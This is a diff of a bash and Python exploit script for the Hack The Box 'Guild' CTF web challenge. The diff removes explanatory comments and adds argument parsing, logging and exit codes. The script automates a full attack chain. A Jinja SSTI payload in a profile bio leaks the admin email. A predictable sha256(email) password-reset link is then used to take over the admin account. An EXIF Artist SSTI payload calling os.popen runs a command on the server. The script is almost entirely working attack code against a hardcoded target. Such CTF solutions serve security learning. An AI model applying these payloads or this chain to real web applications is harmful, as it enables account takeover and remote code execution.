@@ -1,52 +1,145 @@
 #!/usr/bin/env bash
-
-# Challenge: Guild
-# Platform: Hack The Box - CTF Try Out
-# Category: Web
-# Difficulty: Easy
-#
-# Scenario summary:
-# The application asks normal users to wait for a "Guild Master" to verify them.
-# The flag is not visible to regular users, and the interesting app paths are spread
-# across profile sharing, password reset, and image verification.
-#
-# Core concepts used in this solve:
-# 1. Server-Side Template Injection (SSTI) in a shared profile page.
-# 2. Predictable password-reset link generation using sha256(email).
-# 3. A second SSTI sink inside EXIF metadata, reachable only after becoming admin.
-#
-# Real-world lesson:
-# This is exactly the kind of "small issues chaining into a full compromise" flow
-# defenders underestimate:
-# - A "read-only" template injection leaks internal data.
-# - A weak reset-link design turns that leak into account takeover.
-# - An internal moderation/admin workflow becomes the privileged execution sink.
-#
-# Why this challenge takes more than one request:
-# The first SSTI is filtered, so it is mainly useful for leaking data.
-# The second SSTI is unfiltered, but it sits behind admin-only functionality.
-# So the intended path is:
-#   leak admin email -> generate reset token -> take admin -> abuse EXIF SSTI -> read flag
-#
-# Usage:
-#   bash guild_poc.sh
-#   bash guild_poc.sh http://154.57.164.77:31927
-#
-# Expected output:
-#   HTB{...}
-#
-# Challenge files used:
-# - web_guild.zip
-# - unpacked Flask source in ./guild/
-#
-# Final flag recovered on this instance:
-# HTB{mult1pl3_lo0p5_mult1pl3_h0les_58d3764773e4f939ba8933b944b2ed4d}
-
 set -euo pipefail
 
-BASE_URL="${1:-http://154.57.164.77:31927}"
+# -----------------------------------------------------------------------------
+# PoC: Hack The Box - Guild
+# Type: Vulnerability chain (SSTI + predictable reset + EXIF SSTI RCE)
+#
+# This script is intended for authorized CTF infrastructure only.
+# -----------------------------------------------------------------------------
 
-python3 - "$BASE_URL" <<'PY'
+readonly SCRIPT_NAME="$(basename "$0")"
+readonly DEFAULT_TIMEOUT=20
+
+BASE_URL=""
+HOST=""
+PORT=""
+TIMEOUT="${DEFAULT_TIMEOUT}"
+JSON_OUTPUT=0
+VERBOSE=0
+
+usage() {
+  cat <<EOF
+Usage:
+  ${SCRIPT_NAME} <base_url>
+  ${SCRIPT_NAME} <host> <port>
+  ${SCRIPT_NAME} --base-url <url> [options]
+  ${SCRIPT_NAME} --host <host> --port <port> [options]
+
+Options:
+  --base-url <url>      Target base URL (example: http://154.57.164.68:31870)
+  --host <host>         Target host/IP
+  --port <port>         Target port
+  --timeout <seconds>   Request timeout (default: ${DEFAULT_TIMEOUT})
+  --json                Print result as JSON
+  --verbose             Enable verbose debug output
+  -h, --help            Show this help message
+
+Exit codes:
+  0  Success (flag extracted)
+  1  Generic failure
+  2  Invalid arguments
+  3  Connectivity/request failure
+  4  Exploit chain failure
+EOF
+}
+
+log_info() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[*] %s\n' "$*" >&2
+  fi
+}
+
+log_debug() {
+  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[D] %s\n' "$*" >&2
+  fi
+}
+
+log_ok() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[+] %s\n' "$*" >&2
+  fi
+}
+
+log_error() {
+  printf '[-] %s\n' "$*" >&2
+}
+
+parse_args() {
+  local positional=()
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --base-url)
+        BASE_URL="${2:-}"
+        shift 2
+        ;;
+      --host)
+        HOST="${2:-}"
+        shift 2
+        ;;
+      --port)
+        PORT="${2:-}"
+        shift 2
+        ;;
+      --timeout)
+        TIMEOUT="${2:-}"
+        shift 2
+        ;;
+      --json)
+        JSON_OUTPUT=1
+        shift
+        ;;
+      --verbose)
+        VERBOSE=1
+        shift
+        ;;
+      -h|--help)
+        usage
+        exit 0
+        ;;
+      -*)
+        log_error "Unknown option: $1"
+        usage >&2
+        exit 2
+        ;;
+      *)
+        positional+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "${BASE_URL}" ]]; then
+    if [[ ${#positional[@]} -eq 1 ]]; then
+      BASE_URL="${positional[0]}"
+    elif [[ ${#positional[@]} -ge 2 ]]; then
+      HOST="${positional[0]}"
+      PORT="${positional[1]}"
+    fi
+  fi
+
+  if [[ -z "${BASE_URL}" ]]; then
+    if [[ -n "${HOST}" && -n "${PORT}" ]]; then
+      BASE_URL="http://${HOST}:${PORT}"
+    fi
+  fi
+
+  if [[ -z "${BASE_URL}" ]]; then
+    log_error "Provide either base URL or host+port."
+    usage >&2
+    exit 2
+  fi
+}
+
+main() {
+  parse_args "$@"
+
+  log_info "Target: ${BASE_URL}"
+  log_info "Executing full exploit chain..."
+
+  local result
+  if ! result="$(python3 - "$BASE_URL" "$TIMEOUT" "$VERBOSE" <<'PY'
 import hashlib
 import random
 import re
@@ -57,6 +150,12 @@ import requests
 from PIL import Image
 
 base = sys.argv[1].rstrip("/")
+timeout = float(sys.argv[2])
+verbose = sys.argv[3] == "1"
+
+def die(code: int, msg: str) -> None:
+    print(msg)
+    raise SystemExit(code)
 
 
 def rand_user():
@@ -76,139 +175,115 @@ def extract_share_value(html_text):
 
 def upload_image(session, path, filename):
     with open(path, "rb") as handle:
-        return session.post(
-            f"{base}/verification",
-            files={"file": (filename, handle, "image/jpeg")},
-            allow_redirects=True,
-            timeout=20,
-        )
+        return session.post(f"{base}/verification", files={"file": (filename, handle, "image/jpeg")}, allow_redirects=True, timeout=timeout)
 
 
-# Step 1:
-# Register a normal user and log in.
-# We need a regular account because the first vulnerability lives in the profile-sharing feature.
-user, email, password = rand_user()
-user_session = requests.Session()
-user_session.post(
-    f"{base}/signup",
-    data={"email": email, "username": user, "password": password},
-    timeout=20,
-)
-user_session.post(
-    f"{base}/login",
-    data={"username": user, "password": password},
-    allow_redirects=True,
-    timeout=20,
-)
+try:
+    user, email, password = rand_user()
+    if verbose:
+        print(f"DBG_USER:{user}:{email}")
 
-# Step 2:
-# Upload a harmless verification image so the app unlocks the profile page for our user.
-# The app expects a verification record before it allows profile editing and sharing.
-plain_path = "/tmp/guild_plain.jpg"
-Image.new("RGB", (1, 1), (255, 255, 255)).save(plain_path, "JPEG")
-upload_image(user_session, plain_path, "guild_plain.jpg")
+    user_session = requests.Session()
+    user_session.post(f"{base}/signup", data={"email": email, "username": user, "password": password}, timeout=timeout)
+    user_session.post(f"{base}/login", data={"username": user, "password": password}, allow_redirects=True, timeout=timeout)
 
-# Step 3:
-# Generate the public share link for our profile.
-# The vulnerable route is /user/<username>, but the app normally creates that link for us via /getlink.
-user_session.get(f"{base}/getlink", timeout=20)
+    plain_path = "/tmp/guild_plain.jpg"
+    Image.new("RGB", (1, 1), (255, 255, 255)).save(plain_path, "JPEG")
+    upload_image(user_session, plain_path, f"{user}_plain.jpg")
 
-# Step 4:
-# Abuse the profile SSTI to leak the random admin email address.
-# This works because /user/<link> takes our bio, inserts it into a template with Python string formatting,
-# and then sends that result into render_template_string().
-#
-# The blacklist is crude and case-sensitive, but this payload avoids the blocked words.
-leak_admin_email = "{{User.query.filter_by(username='admin').first().email}}"
-user_session.post(f"{base}/profile", data={"bio": leak_admin_email}, timeout=20)
-share_response = user_session.get(f"{base}/user/{user}", timeout=20)
-admin_email = extract_share_value(share_response.text)
+    user_session.get(f"{base}/getlink", timeout=timeout)
 
-# Step 5:
-# Seed a valid reset entry for that email.
-# The forgot-password flow does not mail anything in practice here; it just creates a database row.
-requests.post(f"{base}/forgetpassword", data={"email": admin_email}, timeout=20)
+    leak_admin_email = "{{User.query.filter_by(username='admin').first().email}}"
+    user_session.post(f"{base}/profile", data={"bio": leak_admin_email}, timeout=timeout)
+    share_response = user_session.get(f"{base}/user/{user}", timeout=timeout)
+    admin_email = extract_share_value(share_response.text)
+    if verbose:
+        print(f"DBG_ADMIN_EMAIL:{admin_email}")
 
-# Step 6:
-# Predict the reset URL.
-# The application uses sha256(email) directly, which is completely predictable and not tied to any secret token.
-reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
-new_admin_password = "GuildAdmin123!"
+    if "@" not in admin_email:
+        die(4, f"ERR_EMAIL_LEAK:{admin_email}")
 
-# Step 7:
-# Reset the admin password using the predictable hash.
-#
-# Why this works:
-# - /forgetpassword inserted a row into Validlinks for the admin email.
-# - /changepasswd/<sha256(email)> accepts a POST and updates that account password.
-reset_response = requests.post(
-    f"{base}/changepasswd/{reset_hash}",
-    data={"password": new_admin_password},
-    allow_redirects=True,
-    timeout=20,
-)
-if "Password Updated!" not in reset_response.text:
-    raise RuntimeError("Admin password reset did not succeed")
+    requests.post(f"{base}/forgetpassword", data={"email": admin_email}, timeout=timeout)
+    reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
+    new_admin_password = "GuildAdmin123!"
 
-# Step 8:
-# Log in as admin.
-# Reaching /admin confirms we took over the Guild Master account.
-admin_session = requests.Session()
-admin_login = admin_session.post(
-    f"{base}/login",
-    data={"username": "admin", "password": new_admin_password},
-    allow_redirects=True,
-    timeout=20,
-)
-if "/admin" not in admin_login.url:
-    raise RuntimeError("Admin login failed")
+    reset_response = requests.post(
+        f"{base}/changepasswd/{reset_hash}",
+        data={"password": new_admin_password},
+        allow_redirects=True,
+        timeout=timeout,
+    )
+    if "Password Updated!" not in reset_response.text:
+        die(4, "ERR_RESET_FAILED:Password reset did not succeed")
 
-# Step 9:
-# Prepare a second verification image, but this time with malicious EXIF metadata.
-# The /verify endpoint reads the EXIF Artist field and feeds it into render_template_string()
-# without any blacklist at all.
-#
-# That makes this the real code-execution sink.
-artist_payload = "{{lipsum.__globals__.os.popen('cat flag.txt').read()}}"
-malicious_path = "/tmp/guild_malicious.jpg"
-malicious_img = Image.new("RGB", (1, 1), (0, 0, 0))
-malicious_exif = Image.Exif()
-malicious_exif[315] = artist_payload
-malicious_img.save(malicious_path, "JPEG", exif=malicious_exif)
+    admin_session = requests.Session()
+    admin_login = admin_session.post(
+        f"{base}/login",
+        data={"username": "admin", "password": new_admin_password},
+        allow_redirects=True,
+        timeout=timeout,
+    )
+    if "/admin" not in admin_login.url:
+        die(4, "ERR_ADMIN_LOGIN:Admin login failed")
 
-# Step 10:
-# Upload the malicious image as our normal user.
-# Using a unique filename matters because the app stores the full path in a UNIQUE column.
-upload_image(user_session, malicious_path, "guild_malicious.jpg")
+    artist_payload = "{{lipsum.__globals__.os.popen('cat flag.txt').read()}}"
+    malicious_path = "/tmp/guild_malicious.jpg"
+    malicious_img = Image.new("RGB", (1, 1), (0, 0, 0))
+    malicious_exif = Image.Exif()
+    malicious_exif[315] = artist_payload
+    malicious_img.save(malicious_path, "JPEG", exif=malicious_exif)
 
-# Step 11:
-# Open the admin dashboard and find our latest verification request.
-# The table includes both our user_id and the verification row id needed for /verify.
-admin_page = admin_session.get(f"{base}/admin", timeout=20)
-rows = re.findall(
-    r'<td>(\d+)</td>\s*<td>' + re.escape(user) +
-    r'</td>.*?name="user_id" value="\1".*?name="verification_id" value="(\d+)"',
-    admin_page.text,
-    re.S,
-)
-if not rows:
-    raise RuntimeError("Could not find our verification row on the admin page")
+    upload_image(user_session, malicious_path, f"{user}_evil.jpg")
 
-user_id, verification_id = rows[-1]
+    admin_page = admin_session.get(f"{base}/admin", timeout=timeout)
+    rows = re.findall(
+        r'<td>(\d+)</td>\s*<td>' + re.escape(user) + r'</td>.*?name="user_id" value="\1".*?name="verification_id" value="(\d+)"',
+        admin_page.text,
+        re.S,
+    )
+    if not rows:
+        die(4, "ERR_ROW_NOT_FOUND:Could not find verification row")
 
-# Step 12:
-# Trigger the verification action.
-# This causes the server to read our EXIF Artist field and execute the embedded Jinja payload,
-# which runs `cat flag.txt` from the application working directory.
-verify_response = admin_session.post(
-    f"{base}/verify",
-    data={"user_id": user_id, "verification_id": verification_id},
-    timeout=20,
-)
+    user_id, verification_id = rows[-1]
+    if verbose:
+        print(f"DBG_ROW:{user_id}:{verification_id}")
 
-flag_match = re.search(r"HTB\{[^}]+\}", verify_response.text)
-if not flag_match:
-    raise RuntimeError("Flag was not found in the verification response")
+    verify_response = admin_session.post(
+        f"{base}/verify",
+        data={"user_id": user_id, "verification_id": verification_id},
+        timeout=timeout,
+    )
 
-print(flag_match.group(0))
+    flag_match = re.search(r"HTB\{[^}]+\}", verify_response.text)
+    if not flag_match:
+        die(4, "ERR_FLAG_NOT_FOUND:Flag missing in verify response")
+
+    print(f"OK_FLAG:{flag_match.group(0)}")
+except requests.RequestException as exc:
+    die(3, f"ERR_REQUEST:{exc}")
 PY
+  )"; then
+    case "$?" in
+      3) log_error "Connectivity/request failure."; exit 3 ;;
+      4) log_error "Exploit chain failed."; exit 4 ;;
+      *) log_error "Unexpected runtime failure."; exit 1 ;;
+    esac
+  fi
+
+  log_debug "Exploit output: ${result}"
+  local flag
+  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
+  if [[ -z "${flag}" ]]; then
+    log_error "No flag extracted from output."
+    exit 4
+  fi
+
+  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
+    printf '{"target":"%s","flag":"%s"}\n' "${BASE_URL}" "${flag}"
+  else
+    log_ok "Flag extracted successfully."
+    printf '%s\n' "${flag}"
+  fi
+}
+
+main "$@"
